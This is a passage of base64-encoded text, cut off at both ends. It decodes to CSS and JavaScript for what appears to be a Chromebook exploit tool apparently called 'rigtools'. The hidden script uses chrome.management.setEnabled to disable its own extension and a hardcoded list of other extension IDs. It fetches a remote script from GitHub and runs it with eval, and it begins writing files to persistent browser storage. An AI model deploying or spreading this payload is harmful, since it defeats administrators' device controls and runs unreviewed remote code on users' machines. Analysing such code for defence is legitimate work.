lciB7CiAgZGlzcGxheTogZmxleDsKICBhbGlnbi1pdGVtczogY2VudGVyOwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgoubG9nbyB7CiAgd2lkdGg6IDRlbTsKICBoZWlnaHQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiAxMHB4Owp9CgoudGFibGlzdC1pdGVtIHsKICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwogIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICBwYWRkaW5nOiAxNXB4OwogIGJvcmRlci1yYWRpdXM6IDhweDsKICBkaXNwbGF5OiBmbGV4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7Cn0KCi50YWJsaXN0LWl0ZW0gaW1nIHsKICBtYXgtd2lkdGg6IDI1cHg7CiAgbWFyZ2luLXJpZ2h0OiAxMHB4Owp9CgoudGFibGlzdC1pdGVtIHNwYW4gewogIHBhZGRpbmc6IDEwcHggMDsKICB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpczsKICB3aWR0aDogMTAwJTsKICB3aGl0ZS1zcGFjZTogbm93cmFwOwogIG92ZXJmbG93OiBoaWRkZW47CiAgd29yZC1icmVhazogYnJlYWstYWxsOwp9CgoudGFibGlzdC1pdGVtIHNwYW46aG92ZXIgewogIG92ZXJmbG93OiB2aXNpYmxlOwogIHdoaXRlLXNwYWNlOiBub3JtYWw7CiAgaGVpZ2h0OiBhdXRvOwp9CgpidXR0b24gewogICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgICBjb2xvcjogIzlkYmFlOTsKICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgYm9yZGVyOiAxcHggc29saWQgIzA0N2RiNzsKICAgIGJvcmRlci1yYWRpdXM6IDIwcHg7CiAgICBoZWlnaHQ6IDM1cHg7CiAgICBwYWRkaW5nOiA3cHggMTBweDsKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIGFsaWduLXNlbGY6IGZsZXgtZW5kOwogICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZCAwLjJzIGVhc2UtaW4tb3V0OwogICAgb3V0bGluZTogbm9uZTsKfQoKYnV0dG9uOmhvdmVyIHsKICAgIGJhY2tncm91bmQ6ICMzODM5M2I7Cn0KCmlucHV0IHsKICBwYWRkaW5nOiA4cHggMTZweDsKICBtYXJnaW46IDRweCAycHg7CiAgY29sb3I6IHdoaXRlOwogIGJhY2tncm91bmQtY29sb3I6ICMwYTBhMGE7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKfQoKaW5wdXQ6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICMxMTE7CiAgYm9yZGVyLWNvbG9yOiAjZmZmOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbiB7CiAgcG9zaXRpb246IHJlbGF0aXZlOwogIGRpc3BsYXk6IGlubGluZS1mbGV4OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAganVzdGlmeS1jb250ZW50OiBmbGV4LXN0YXJ0OwogIHBhZGRpbmc6IDlweCAxNXB4IDlweCA2MHB4OwogIGJhY2tncm91bmQtY29sb3I6IHdoaXRlOwogIGNvbG9yOiBibGFjazsKICBib3JkZXItcmFkaXVzOiA2cHg7CiAgbWFyZ2luOiA0cHggMnB4OwogIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcywgY29sb3IgMC4zczsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b246aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOjpiZWZvcmUgewogIGNvbnRlbnQ6ICcnOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBsZWZ0OiAxMnB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICB3aWR0aDogNDJweDsKICBoZWlnaHQ6IDIycHg7CiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMzsKICBib3JkZXItcmFkaXVzOiAxMnB4Owp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbjo6YWZ0ZXIgewogIGNvbnRlbnQ6ICcnOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBsZWZ0OiAxNHB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICB3aWR0aDogMThweDsKICBoZWlnaHQ6IDE4cHg7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICBib3JkZXItcmFkaXVzOiA1MCU7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXTo6YmVmb3JlIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvblt0b2dnbGVkPSJ0cnVlIl06OmFmdGVyIHsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSkgdHJhbnNsYXRlWCgyMHB4KTsKfQoKLmNvbnRhaW5lciB7CiAgZGlzcGxheTogZmxleDsKICBnYXA6IDEwcHg7Cn0KCiNjb2RlLXJ1biB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICBjb2xvcjogYmxhY2s7CiAgYm9yZGVyOiBub25lOwogIGJvcmRlci1yYWRpdXM6IDVweDsKICBwYWRkaW5nOiA4cHggMTZweDsKICBmb250LXdlaWdodDogYm9sZDsKICBjdXJzb3I6IHBvaW50ZXI7Cn0KCiNjb2RlLXJ1bjpob3ZlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2UyZTJlMjsKfQoKI2NvZGUgewogIGJhY2tncm91bmQ6ICMwMDA7CiAgY29sb3I6IHdoaXRlOwogIHdpZHRoOiAxMDAlOwogIG1pbi1oZWlnaHQ6IDUwcHg7CiAgaGVpZ2h0OiAyMDBweDsKICByZXNpemU6IGJvdGg7CiAgYm9yZGVyOiAxcHggc29saWQgIzRCNEI0RDsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZSwgc2Fucy1zZXJpZjsKICBwYWRkaW5nOiA4cHg7CiAgYm94LXNpemluZzogYm9yZGVyLWJveDsKfQoKI2NvZGU6Zm9jdXMgewogIGJvcmRlci1jb2xvcjogI2ZmZjsKfQoKLnRvYXN0W3BvcG92ZXJdOnBvcG92ZXItb3BlbiB7CiAgb3BhY2l0eTogMTsKICB0b3A6IDVweDsKICBsZWZ0OiA1MCU7Cn0KCkBzdGFydGluZy1zdHlsZSB7CiAgLnRvYXN0W3BvcG92ZXJdOnBvcG92ZXItb3BlbiB7CiAgICBvcGFjaXR5OiAwOwogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xMDAlKTsKICB9Cn0KCi50b2FzdFtwb3BvdmVyXSB7CiAgcG9zaXRpb246IGZpeGVkOwogIGluc2V0OiB1bnNldDsKICBwYWRkaW5nOiA1cHggMTBweDsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgb3BhY2l0eTogMDsKICBmb250LXdlaWdodDogYm9sZDsKICBiYWNrZ3JvdW5kOiAjMGEwYTBhOwogIGNvbG9yOiB3aGl0ZTsKICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0Owp9CgpkaWFsb2cgewogIG9wYWNpdHk6IDA7CiAgcGFkZGluZzogMzBweDsKICBib3JkZXI6IDFweCBzb2xpZCAjMmQyZDJkOwogIGJhY2tncm91bmQ6ICMwMDA7CiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgdHJhbnNpdGlvbjogYWxsIDAuNXM7CiAgbWluLXdpZHRoOiA1MHZ3OwogIG1pbi1oZWlnaHQ6IDYwdmg7CiAgbWF4LXdpZHRoOiA1MHZ3OwogIG1heC1oZWlnaHQ6IDYwdmg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwp9CgpkaWFsb2dbb3Blbl0gewogIG9wYWNpdHk6IDE7CiAgdHJhbnNmb3JtOiBzY2FsZSgxKTsKfQoKZGlhbG9nOjpiYWNrZHJvcCB7CiAgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjI1KTsKICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoM3B4KTsKfQoKZGlhbG9nIGRpdiB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKfQoKZGlhbG9nIHAgewogIG1hcmdpbi1ib3R0b206IDlweDsKICBwYWRkaW5nOiA5cHg7CiAgYm9yZGVyOiAxcHggc29saWQgIzI3MjcyYTsKICBmb250LXdlaWdodDogNzAwOwp9CgpkaWFsb2cgaDEgewogIGZvbnQtc2l6ZTogMS41cmVtOwogIGNvbG9yOiB3aGl0ZTsKICBmb250LXdlaWdodDogOTAwOwp9Cgp3aGl0ZWJ1dHRvbnMgYnV0dG9uIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsKICBib3JkZXI6IDFweCBzb2xpZCByZ2IoNCwgMTI1LCAxODMpOwogIGNvbG9yOiByZ2IoMTY4LCAxOTksIDI1MCk7Cn0KCndoaXRlYnV0dG9ucyBidXR0b246aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMTY4LCAxOTksIDI1MCwgMC4xKTsKfQoKbGl0c3R1ZmYgewogIGNvbG9yOiAjNDQ0OwogIGZvbnQtZmFtaWx5OiBtb25vc3BhY2UsIHNhbnMtc2VyaWY7CiAgZm9udC1zaXplOiAxMnB4OwogIGZvbnQtc3R5bGU6IGl0YWxpYzsKICBtYXJnaW4tbGVmdDogNnB4Owp9CiAgICA8L3N0eWxlPgogIGA7CgpvbmxvYWQgPSBhc3luYyBmdW5jdGlvbiB4KCkgewogICAgbGV0IGZvdW5kTm90aGluZyA9IHRydWU7CiAgICBkb2N1bWVudC5vcGVuKCk7CiAgICB0aGlzLmRvY3VtZW50LndyaXRlKGh0bWxTdHlsZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwoKICAgIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7CiAgICAgICAgY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZS5vcGVuVVJMKCJkYXRhOnRleHQvaHRtbCw8aDE+SGVsbG88L2gxPiIpOwogICAgICAgIGRvY3VtZW50LndyaXRlKGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNidG5fRk1QX29wZW5VUkwiKS5vbmNsaWNrID0gZnVuY3Rpb24oZXYpIHt9OwogICAgfQoKICAgIGlmIChjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImJlZm9yZWVuZCIsIG1hbmFnZW1lbnRUZW1wbGF0ZSk7CiAgICAgICAgY29uc3QgZXh0bGlzdF9lbGVtZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLmV4dGxpc3QiKTsKCiAgICAgICAgYXdhaXQgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgY29uc3QgY29udGFpbmVyX2V4dGVuc2lvbnMgPSBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoCiAgICAgICAgICAgICIjY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiCiAgICAgICAgKTsKCiAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI2N1cnJlbnQtZXh0ZW5zaW9uIikub25jbGljayA9CiAgICAgICAgICAgIGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZ3JhYmlkdG9raWxsID0gY2hyb21lLnJ1bnRpbWUuaWQ7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChncmFiaWR0b2tpbGwsIGZhbHNlKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJ1bnN1Y2Nlc3NmdWwiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKCiAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI3Jtdi1jbW4tYmx0Iikub25jbGljayA9IGZ1bmN0aW9uIGRmKCkgewogICAgICAgICAgICBjb25zdCBibG9hdElkcyA9IFsKICAgICAgICAgICAgICAgICJjZ2JiYmptZ2RwbmlmaWpjb25oYW1nZ2plaGxhbWNpZiIsCiAgICAgICAgICAgICAgICAibGZrYmJtY2xucGFpaHBhYWpob2hoZmRqZWxjaGtpa2YiLAogICAgICAgICAgICAgICAgIm5jYm9mbmhtbWZmZm1jZG1iamZhaWdlcGtnbWpubG5lIiwKICAgICAgICAgICAgICAgICJwb2htZ29iZGVhamVtY2lmcG9sZG5uaGZmam5ua2hnZiIsCiAgICAgICAgICAgICAgICAiYmVjZHBsZmFsb29mbGFuaXBqb2JsY21wYWVra2JiaGUiLAogICAgICAgICAgICAgICAgImZlZXBtZGxtaHBsYW9qYWJlb2VjYW9iZm1pYm9vYWlkIiwKICAgICAgICAgICAgICAgICJhZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbSIsCiAgICAgICAgICAgICAgICAiaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiLAogICAgICAgICAgICAgICAgImZpbGdwamtkbWppbm1qYmVwYnBtbmZvYm1qbWdpbW9uIiwKICAgICAgICAgICAgICAgICJra2JtZGdqZ2djZGFqY2tkbGJuZ2Rqb25wY2hwYWllYSIsCiAgICAgICAgICAgICAgICAibmpkbmljbGdlZ2lqZGNkbGlrbGdpZWljYW5wbWNuZ2oiLAogICAgICAgICAgICAgICAgImhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiwKICAgICAgICAgICAgXTsKCiAgICAgICAgICAgIGxldCBleHRzID0ge307CiAgICAgICAgICAgIGxldCBleHRsbmd0aCA9IDA7CgogICAgICAgICAgICBmdW5jdGlvbiBnZXRMZW5ndGgoKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCwgaSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBleHRlbnNpb25FeGlzdHMoaWQpLnRoZW4oKHJlcykgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcykgZXh0bG5ndGgrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChibG9hdElkcy5sZW5ndGggLSAxID09PSBpKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGluaXRFeHRPYmooKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCkgPT4KICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihleHRzLCBKU09OLnBhcnNlKGB7IiR7ZS5pZH0iOiIke2Uuc2hvcnROYW1lfSJ9YCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGV4dHMpLmxlbmd0aCA9PSBleHRsbmd0aCkgcmVzb2x2ZSgpOwogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZ2V0TGVuZ3RoKCkudGhlbigoKSA9PgogICAgICAgICAgICAgICAgaW5pdEV4dE9iaigpLnRoZW4oKCkgPT4KICAgICAgICAgICAgICAgICAgICBtYWtlRGlhbG9nKAogICAgICAgICAgICAgICAgICAgICAgICAiQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRpc2FibGUgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zPyIsCiAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC52YWx1ZXMoZXh0cyksCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkge30sCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRpc2FibGVkRXh0cyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoZXh0cykuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpZCA9PSBjaHJvbWUucnVudGltZS5pZCkgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5wdXNoKGUuc2hvcnROYW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFkaXNhYmxlZEV4dHMubGVuZ3RoIDwgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGlzYWJsZWQgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zOlxyXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5qb2luKCJcclxuIiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDI1MCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICk7CiAgICAgICAgfTsKCiAgICAgICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT0gSlNPTi5zdHJpbmdpZnkoW10pKSB7CiAgICAgICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zCiAgICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAgIC5zZXRBdHRyaWJ1dGUoInN0eWxlIiwgImRpc3BsYXk6IG5vbmU7Iik7CiAgICAgICAgfQoKICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKS5vbmNsaWNrID0KICAgICAgICAgICAgZnVuY3Rpb24gZGYoZSkgewogICAgICAgICAgICAgICAgbGV0IGV4dHMgPSB7fTsKCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBpbml0RXh0T2JqKCkgewogICAgICAgICAgICAgICAgICAgIGxldCBpZGxpc3QgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBpZGxpc3QuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGV4dHMsIEpTT04ucGFyc2UoYHsiJHtlLmlkfSI6IiR7ZS5zaG9ydE5hbWV9In1gKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGV4dHMpLmxlbmd0aCA9PSBpZGxpc3QubGVuZ3RoKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaW5pdEV4dE9iaigpLnRoZW4oKCkgPT4gewogICAgICAgICAgICAgICAgICAgIG1ha2VEaWFsb2coCiAgICAgICAgICAgICAgICAgICAgICAgICJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGlzYWJsZSB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM/IiwKICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhleHRzKSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7fSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlzYWJsZWRFeHRzID0gW107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZS5lbmFibGVkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMucHVzaChlLnNob3J0TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGlkLCBmYWxzZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZGlzYWJsZWRFeHRzLmxlbmd0aCA8IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRpc2FibGVkIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9uczpcclxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMuam9pbigiXHJcbiIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLmxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAyNTApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9OwogICAgfQogICAgY29uc3Qgb3RoZXJGZWF0dXJlcyA9IHdpbmRvdy5jaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpOwogICAgY29uc3QgcGVybWlzc2lvbnMgPSBvdGhlckZlYXR1cmVzLnBlcm1pc3Npb25zOwoKICAgIG5ldyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzKCkuYWN0aXZhdGUoKTsKICAgIGRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKAogICAgICAgICJiZWZvcmVlbmQiLAogICAgICAgIGAKICAgICAgPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KICAgICAgPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi8iPgogICAgICBgCiAgICApOwoKICAgIGNvbnN0IFNjcmlwdEJ1dHRvbnMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjb3RoZXItYnV0dG9ucyIpOwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3N3YW1wIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICBmZXRjaCgKICAgICAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHRzL3N3YW1wLXVsdHJhLmpzIgogICAgICAgICAgICApCiAgICAgICAgICAgIC50aGVuKChyZXMpID0+IHJlcy50ZXh0KCkpCiAgICAgICAgICAgIC50aGVuKGV2YWwpOwogICAgfTsKCiAgICBTY3JpcHRCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiN1cGRhdGUiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIChhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGZzID0gYXdhaXQgbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzb2x2ZSkgewogICAgICAgICAgICAgICAgd2Via2l0UmVxdWVzdEZpbGVTeXN0ZW0oUEVSU0lTVEVOVCwgMiAqIDEwMjQgKiAxMDI0LCByZXNvbHZlKTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24od3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXN